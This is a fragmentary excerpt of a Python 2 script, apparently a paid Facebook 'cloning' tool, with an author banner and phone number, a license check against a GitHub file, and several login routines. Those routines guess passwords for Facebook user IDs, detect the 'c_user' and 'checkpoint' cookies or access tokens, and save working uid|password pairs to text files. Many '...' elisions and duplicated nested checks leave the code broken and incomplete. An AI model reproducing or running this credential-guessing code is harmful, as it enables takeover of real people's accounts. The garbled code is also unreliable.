...
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄IBRAHIM𝙧᭄
'\x1b[1;91m'   Author      ||    Muhammd Ibrahim   
'\x1b[1;92m'   Github      ||     Alitrick
'\x1b[1;93m'   FB ID       ||    Muhammd Ibrahim
'\x1b[1;94m'   TOOL TYPE   ||    PAID
'\x1b[1;96m'   WAP NUMBER  ||     03178064363         
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄IBRAHIM𝙧᭄
"""
dec="2"
server="2"
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/ibrahim.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        ...
        os.system("xdg-open https://wa.me/+923178064363")
        
    r1=requests.get("https://raw.githubusercontent.com/Muhammd Ibrahim/Paid/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In Ibrahim Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/Alitricke/Paid")
...
def numcloning():
    ...
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄IBRAHIM𝙧᭄"| lolcat')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;92m[IBRAHIM-OK] "+coc+user + " | " + pass1
                    cp=open('IBRAHIM random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
    ...
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [IBRAHIM])"
    print 40*'-'
    print ''
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[IBRAHIM_OK] "+uid + " | " + pass1
    ...
    print "\033[1;93m NAAM TO SONA HOGAA [IBRAHIM])"
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[IBRAHIM-OK] "+uid + " | " + pass3
                                    cp=open('IBRAHIM-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[IBRAHIM-OK] "+uid + " | " + pass1
                    cp=open('IBRAHIM-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[IBRAHIM-OK] "+uid + " | " + pass2
                            cp=open('IBRAHIM-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[IBRAHIM-CP] "+uid + " | " + pass5
                                                    cp=open('IBRAHIM-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
